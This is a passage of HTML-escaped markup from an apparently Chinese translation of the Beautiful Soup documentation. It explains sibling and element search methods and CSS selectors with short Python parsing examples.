&lt;p&gt;&lt;code&gt;find_parent()&lt;/code&gt; 和 &lt;code&gt;find_parents()&lt;/code&gt; 方法会让人联想到 &lt;a href=&quot;#parent&quot;&gt;.parent&lt;/a&gt; 和 &lt;a href=&quot;#parents&quot;&gt;.parents&lt;/a&gt; 属性.它们之间的联系非常紧密.搜索父辈节点的方法实际上就是对 &lt;code&gt;.parents&lt;/code&gt; 属性的迭代搜索.&lt;/p&gt;
&lt;h2 id=&quot;find-next-siblings-合-find-next-sibling&quot;&gt;&lt;a href=&quot;#find-next-siblings-合-find-next-sibling&quot; class=&quot;headerlink&quot; title=&quot;find_next_siblings() 合 find_next_sibling()&quot;&gt;&lt;/a&gt;find_next_siblings() 合 find_next_sibling()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find_next_siblings( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find_next_sibling( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这2个方法通过 &lt;a href=&quot;#next-siblings-previous-siblings&quot;&gt;.next_siblings&lt;/a&gt; 属性对当tag的所有后面解析 [5] 的兄弟tag节点进行迭代, &lt;code&gt;find_next_siblings()&lt;/code&gt; 方法返回所有符合条件的后面的兄弟节点, &lt;code&gt;find_next_sibling()&lt;/code&gt; 只返回符合条件的后面的第一个tag节点.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;first_link = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_link&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_link.find_next_siblings(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_story_paragraph = soup.find(&amp;quot;p&amp;quot;, &amp;quot;story&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_story_paragraph.find_next_sibling(&amp;quot;p&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;find-previous-siblings-和-find-previous-sibling&quot;&gt;&lt;a href=&quot;#find-previous-siblings-和-find-previous-sibling&quot; class=&quot;headerlink&quot; title=&quot;find_previous_siblings() 和 find_previous_sibling()&quot;&gt;&lt;/a&gt;find_previous_siblings() 和 find_previous_sibling()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find_previous_siblings( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find_previous_sibling( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这2个方法通过 &lt;a href=&quot;#next-siblings-previous-siblings&quot;&gt;.previous_siblings&lt;/a&gt; 属性对当前tag的前面解析 [5] 的兄弟tag节点进行迭代, &lt;code&gt;find_previous_siblings()&lt;/code&gt; 方法返回所有符合条件的前面的兄弟节点, &lt;code&gt;find_previous_sibling()&lt;/code&gt; 方法返回第一个符合条件的前面的兄弟节点:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;last_link = soup.find(&amp;quot;a&amp;quot;, id=&amp;quot;link3&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;last_link&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;last_link.find_previous_siblings(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_story_paragraph = soup.find(&amp;quot;p&amp;quot;, &amp;quot;story&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_story_paragraph.find_previous_sibling(&amp;quot;p&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;find-all-next-和-find-next&quot;&gt;&lt;a href=&quot;#find-all-next-和-find-next&quot; class=&quot;headerlink&quot; title=&quot;find_all_next() 和 find_next()&quot;&gt;&lt;/a&gt;find_all_next() 和 find_next()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find_all_next( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find_next( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这2个方法通过 &lt;a href=&quot;#next-elements-previous-elements&quot;&gt;.next_elements&lt;/a&gt; 属性对当前tag的之后的 [5] tag和字符串进行迭代, &lt;code&gt;find_all_next()&lt;/code&gt; 方法返回所有符合条件的节点, &lt;code&gt;find_next()&lt;/code&gt; 方法返回第一个符合条件的节点:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;first_link = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_link&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_link.find_all_next(text=True)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;Elsie&amp;apos;, u&amp;apos;,\n&amp;apos;, u&amp;apos;Lacie&amp;apos;, u&amp;apos; and\n&amp;apos;, u&amp;apos;Tillie&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  u&amp;apos;;\nand they lived at the bottom of a well.&amp;apos;, u&amp;apos;\n\n&amp;apos;, u&amp;apos;...&amp;apos;, u&amp;apos;\n&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_link.find_next(&amp;quot;p&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个例子中,字符串 “Elsie”也被显示出来,尽管它被包含在我们开始查找的&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签的里面.第二个例子中,最后一个&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签也被显示出来,尽管它与我们开始查找位置的&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签不属于同一部分.例子中,搜索的重点是要匹配过滤器的条件,并且在文档中出现的顺序而不是开始查找的元素的位置.&lt;/p&gt;
&lt;h2 id=&quot;find-all-previous-和-find-previous&quot;&gt;&lt;a href=&quot;#find-all-previous-和-find-previous&quot; class=&quot;headerlink&quot; title=&quot;find_all_previous() 和 find_previous()&quot;&gt;&lt;/a&gt;find_all_previous() 和 find_previous()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find_all_previous( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find_previous( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这2个方法通过 &lt;a href=&quot;#next-elements-previous-elements&quot;&gt;.previous_elements&lt;/a&gt; 属性对当前节点前面 [5] 的tag和字符串进行迭代, &lt;code&gt;find_all_previous()&lt;/code&gt; 方法返回所有符合条件的节点, &lt;code&gt;find_previous()&lt;/code&gt; 方法返回第一个符合条件的节点.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;first_link = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_link&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_link.find_all_previous(&amp;quot;p&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;Once upon a time there were three little sisters; ...&amp;lt;/p&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;first_link.find_previous(&amp;quot;title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;find_all_previous(&amp;quot;p&amp;quot;)&lt;/code&gt; 返回了文档中的第一段(class=”title”的那段),但还返回了第二段,&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签包含了我们开始查找的&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签.不要惊讶,这段代码的功能是查找所有出现在指定&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签之前的&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签,因为这个&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签包含了开始的&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签,所以&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签一定是在&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;之前出现的.&lt;/p&gt;
&lt;h2 id=&quot;CSS选择器&quot;&gt;&lt;a href=&quot;#CSS选择器&quot; class=&quot;headerlink&quot; title=&quot;CSS选择器&quot;&gt;&lt;/a&gt;CSS选择器&lt;/h2&gt;&lt;p&gt;Beautiful Soup支持大部分的CSS选择器 [6] ,在 &lt;code&gt;Tag&lt;/code&gt; 或 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象的 &lt;code&gt;.select()&lt;/code&gt; 方法中传入字符串参数,即可使用CSS选择器的语法找到tag:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;p nth-of-type(3)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过tag标签逐层查找:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;body a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot;  id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;html head title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;找到某个tag标签下的直接子标签 [6] :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;head &amp;gt; title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;p &amp;gt; a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot;  id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;p &amp;gt; a:nth-of-type(2)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;p &amp;gt; #link1&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;body &amp;gt; a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# []&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;找到兄弟节点标签:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;#link1 ~ .sister&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot;  id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;#link1 + .sister&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过CSS的类名查找:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.select(&amp;quot;.sister&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; 